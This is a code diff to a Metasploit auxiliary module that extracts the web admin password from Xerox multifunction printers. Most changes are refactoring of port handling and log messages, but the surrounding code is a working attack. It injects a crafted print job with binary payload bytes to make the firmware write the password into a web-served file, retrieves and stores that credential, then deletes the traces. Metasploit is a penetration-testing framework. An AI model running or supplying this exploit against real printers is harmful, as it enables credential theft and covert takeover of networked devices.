@@ -1,7 +1,8 @@
 #
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
+
 require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
@@ -13,7 +14,8 @@ class Metasploit3 < Msf::Auxiliary
     super(update_info(info,
       'Name'           => 'Xerox Administrator Console Password Extract',
       'Description'    => %{
-        This module will extract the management consoles admin password from the Xerox file system using firmware bootstrap injection.
+        This module will extract the management consoles admin password from the Xerox file system
+        using firmware bootstrap injection.
       },
       'Author'         =>
         [
@@ -31,37 +33,40 @@ class Metasploit3 < Msf::Auxiliary
       ], self.class)
   end
 
+  def jport
+    datastore['JPORT']
+  end
+
   # Time to start the fun
   def run
-    print_status("Attempting to extract the web consoles admin password from the Xerox MFP at #{rhost}")
-    unless write
-      return
-    end
+    print_status("#{rhost}:#{jport} - Attempting to extract the web consoles admin password...")
+    return unless write
+
+    print_status("#{rhost}:#{jport} - Waiting #{datastore['TIMEOUT']} seconds...")
     sleep(datastore['TIMEOUT'])
     passwd = retrieve
     remove
 
     if passwd
-      print_good("#{rhost}:#{rport} - Password found: #{passwd}")
+      print_good("#{rhost}:#{jport} - Password found: #{passwd}")
 
       loot_name     = 'xerox.password'
       loot_type     = 'text/plain'
-      loot_filename = 'xerox-password.text'
+      loot_filename = 'xerox_password.text'
       loot_desc     = 'Xerox password harvester'
       p = store_loot(loot_name, loot_type, datastore['RHOST'], passwd, loot_filename, loot_desc)
-      print_status("Credentials saved in: #{p}")
+      print_status("#{rhost}:#{jport} - Credentials saved in: #{p}")
 
       register_creds('Xerox-HTTP', rhost, rport, 'Admin', passwd)
 
     else
-      print_status('No credentials extracted')
-      return
+      print_error("#{rhost}:#{jport} - No credentials extracted")
     end
   end
 
   #Trigger firmware bootstrap write out password data to URL root
   def write
-    print_status('Sending print job')
+    print_status("#{rhost}:#{jport} - Sending print job")
     create_print_job = '%%XRXbegin' + "\x0a"
     create_print_job << '%%OID_ATT_JOB_TYPE OID_VAL_JOB_TYPE_DYNAMIC_LOADABLE_MODULE' + "\x0a"
     create_print_job << '%%OID_ATT_JOB_SCHEDULING OID_VAL_JOB_SCHEDULING_AFTER_COMPLETE' + "\x0a"
@@ -89,18 +94,17 @@ class Metasploit3 < Msf::Auxiliary
     create_print_job << "\x00\x28\x00\x00"
 
     begin
-      connect(true, 'RPORT' => datastore['JPORT'].to_i)
+      connect(true, 'RPORT' => jport)
       sock.put(create_print_job)
     rescue ::Timeout::Error, Rex::ConnectionError, Rex::ConnectionRefused, HostUnreachable, Rex::ConnectionTimeout, Rex::AddressInUse
-      print_error("Error connecting to #{rhost}")
-      return
+      print_error("#{rhost}:#{jport} - Error connecting to #{rhost}")
     ensure
       disconnect
     end
   end
 
   def retrieve
-    print_status("Retrieving password from #{rhost}")
+    print_status("#{rhost}:#{jport} - Retrieving password from #{rhost}")
     request = "GET /Praeda.txt HTTP/1.0\r\n\r\n"
 
     begin
@@ -110,7 +114,7 @@ class Metasploit3 < Msf::Auxiliary
       passwd = res.match(/\r\n\s(.+?)\n/)
       return passwd ? passwd[1] : ''
     rescue ::EOFError, ::Timeout::Error, Rex::ConnectionError, Rex::ConnectionRefused, HostUnreachable, Rex::ConnectionTimeout, Rex::AddressInUse, EOFError
-      print_error("Error getting password from #{rhost}")
+      print_error("#{rhost}:#{jport} - Error getting password from #{rhost}")
       return
     ensure
       disconnect
@@ -119,7 +123,7 @@ class Metasploit3 < Msf::Auxiliary
 
   # Trigger firmware bootstrap to delete the trace files and praeda.txt file from URL
   def remove
-    print_status('Removing print job')
+    print_status("#{rhost}:#{jport} - Removing print job")
     remove_print_job = '%%XRXbegin' + "\x0A"
     remove_print_job << '%%OID_ATT_JOB_TYPE OID_VAL_JOB_TYPE_DYNAMIC_LOADABLE_MODULE' + "\x0A"
     remove_print_job << '%%OID_ATT_JOB_SCHEDULING OID_VAL_JOB_SCHEDULING_AFTER_COMPLETE' + "\x0A"
@@ -144,11 +148,10 @@ class Metasploit3 < Msf::Auxiliary
     remove_print_job << "\x75\xe1\x00\x28\x00\x00"
 
     begin
-      connect(true, 'RPORT' => datastore['JPORT'].to_i)
+      connect(true, 'RPORT' => jport)
       sock.put(remove_print_job)
     rescue ::Timeout::Error, Rex::ConnectionError, Rex::ConnectionRefused, HostUnreachable, Rex::ConnectionTimeout, Rex::AddressInUse
-      print_error("Error removing print job from #{rhost}")
-      return
+      print_error("#{rhost}:#{jport} - Error removing print job from #{rhost}")
     ensure
       disconnect
     end
